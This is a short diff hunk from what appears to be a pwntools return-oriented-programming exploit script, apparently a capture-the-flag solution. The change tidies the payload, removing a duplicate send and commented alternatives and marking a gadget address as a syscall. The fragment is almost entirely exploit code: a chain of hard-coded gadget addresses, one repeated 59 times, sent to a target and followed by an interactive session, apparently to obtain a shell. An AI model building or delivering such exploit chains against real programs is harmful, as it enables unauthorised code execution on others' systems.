@@ -24,11 +24,7 @@ p +=p64(0x00000000004613b0) *59
 
 
 
-p+=p64(0x000000000040120b)
-#ropchain+="\x0b\x12\x40"
-rop.sendline(p)
-#ropchain=p32(0x0040120b) #return
-
+p+=p64(0x000000000040120b) #syscall
 
 rop.sendline(p)
 rop.interactive()
